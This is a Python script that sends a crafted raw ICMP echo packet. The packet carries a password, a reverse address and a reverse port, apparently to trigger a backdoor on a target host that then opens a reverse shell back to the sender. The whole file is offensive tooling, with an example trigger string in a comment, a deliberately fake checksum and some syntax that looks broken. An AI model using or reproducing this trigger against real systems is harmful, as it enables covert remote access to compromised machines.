#!/usr/bin/env python

import os
import sys
import socket
import struct
import select
import time
 
ICMP_ECHO_REQUEST = 8
 
def icmp_send(dest_addr, key, reverse_addr, reverse_port):

    icmp = socket.getprotobyname("icmp")

    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error (errno, msg):
        if errno == 1:
            msg = msg + "This program must be run with root privileges."
            raise socket.error(msg)
        raise
 
    pkt_id = 0xABCD
    dest_addr  =  socket.gethostbyname(dest_addr)
    pkt_checksum = 55555

    command = key + " " + reverse_addr + " " + reverse_port  #icmp data
	#p4ssw0rd 192.168.199.65 8989
    # Make a dummy heder with a fake checksum.
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, pkt_checksum, pkt_id, 1)
    bytesInDouble = struct.calcsize("d")
    data = command + " " + (192 - bytesInDouble - len(command) - 1) * "Q"
 
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))

    my_socket.close()

def usage(name):
    print ("Usage:\n\t%s [DESTINATION_ADDRESS] [KEY] [REVERSE_ADDRESS] [REVERSE_PORT]" % name)
    exit(1)
 
if __name__ == '__main__':

    args = sys.argv

    if len(args) != 5:
        usage(args[0])

    icmp_send(args[1], args[2], args[3], args[4])
